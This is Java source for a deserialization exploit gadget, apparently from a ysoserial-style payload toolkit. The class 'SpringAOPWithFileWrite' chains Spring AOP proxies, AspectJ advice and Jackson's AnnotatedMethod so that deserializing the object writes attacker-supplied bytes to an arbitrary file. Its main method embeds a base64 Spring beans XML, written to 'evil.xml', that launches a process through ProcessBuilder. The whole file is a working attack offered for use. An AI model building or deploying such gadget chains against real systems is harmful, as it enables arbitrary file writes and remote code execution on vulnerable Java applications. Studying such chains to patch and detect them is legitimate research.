package com.h2tg.ysogate.payloads.gadgets;

import com.fasterxml.jackson.databind.introspect.AnnotatedMethod;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.bullet.jdk.GHashMap;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.codec.binary.Base64;
import org.springframework.aop.aspectj.AspectJAfterReturningAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor;
import org.springframework.aop.interceptor.ExposeInvocationInterceptor;
import org.springframework.aop.support.NameMatchMethodPointcutAdvisor;
import org.springframework.util.FileCopyUtils;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static com.h2tg.ysogate.utils.Reflections.createWithoutConstructor;

@Dependencies({
        "org.springframework:spring-aop >= 4.3.0.RC1",
        "org.aspectj:aspectjweaver",
        "com.fasterxml.jackson.core:jackson-databind"
})
public class SpringAOPWithFileWrite extends PayloadRunner implements CommandObjectPayload<Object>
{
    @Override
    public Object getObject(String command) throws Exception
    {
        int sep = command.lastIndexOf(';');
        if ( sep < 0 ) {
            throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
        }
        String[] parts = command.split(";");
        String filename = parts[0];
        byte[] content = Base64.decodeBase64(parts[1]);
        File file=new File(filename);

        HashMap<String, Object[]> hashMap = new HashMap<>();
        hashMap.put("test", new Object[]{content,file});

        Hashtable<String, String> hashtable = new Hashtable<>();
        hashtable.put("test", "any");

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(hashMap);

        ExposeInvocationInterceptor exposeInvocationInterceptor = createWithoutConstructor(ExposeInvocationInterceptor.class);
        NameMatchMethodPointcutAdvisor advisor0 = new NameMatchMethodPointcutAdvisor(exposeInvocationInterceptor);
        advisor0.setMappedName("get");

        Method method = FileCopyUtils.class.getMethod("copy", byte[].class, File.class);
        AspectJAfterReturningAdvice advice = makeAdviceForMethod(method);
        AfterReturningAdviceInterceptor adviceInterceptor = new AfterReturningAdviceInterceptor(advice);
        NameMatchMethodPointcutAdvisor advisor = new NameMatchMethodPointcutAdvisor(adviceInterceptor);
        advisor.setMappedName("get");


        advisedSupport.addAdvisor(advisor0);
        advisedSupport.addAdvisor(advisor);

        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Map proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, handler);
        GHashMap gHashMap = new GHashMap();
        HashMap h = gHashMap.readObject2Equals(proxy, hashtable);
        return h;
    }


    public static AspectJAfterReturningAdvice makeAdviceForMethod(Method method) throws Exception
    {
        AnnotatedMethod annotatedMethod = new AnnotatedMethod(null,method,null,null);
        SingletonAspectInstanceFactory aspectInstanceFactory = new SingletonAspectInstanceFactory(annotatedMethod);
        AspectJAfterReturningAdvice advice = new AspectJAfterReturningAdvice(AnnotatedMethod.class.getMethod("call", Object[].class), new AspectJExpressionPointcut(), aspectInstanceFactory);
        advice.setArgumentNames("test");
        advice.setReturningName("test");
        return advice;
    }

    public static void main(final String[] args) throws Exception
    {
        PayloadRunner.run(SpringAOPWithFileWrite.class, new String[]{"e:/evil.xml;PGJlYW5zIHhtbG5zPSJodHRwOi8vd3d3LnNwcmluZ2ZyYW1ld29yay5vcmcvc2NoZW1hL2JlYW5zIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4c2k6c2NoZW1hTG9jYXRpb249Imh0dHA6Ly93d3cuc3ByaW5nZnJhbWV3b3JrLm9yZy9zY2hlbWEvYmVhbnMgaHR0cDovL3d3dy5zcHJpbmdmcmFtZXdvcmsub3JnL3NjaGVtYS9iZWFucy9zcHJpbmctYmVhbnMueHNkIj4NCiAgPGJlYW4gaWQ9InBiIiBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIiBpbml0LW1ldGhvZD0ic3RhcnQiPg0KICAgIDxjb25zdHJ1Y3Rvci1hcmc+DQogICAgICA8bGlzdD4NCiAgICAgICAgPHZhbHVlPmNhbGM8L3ZhbHVlPg0KICAgICAgPC9saXN0Pg0KICAgIDwvY29uc3RydWN0b3ItYXJnPg0KICA8L2JlYW4+DQo8L2JlYW5zPg=="});
    }
}
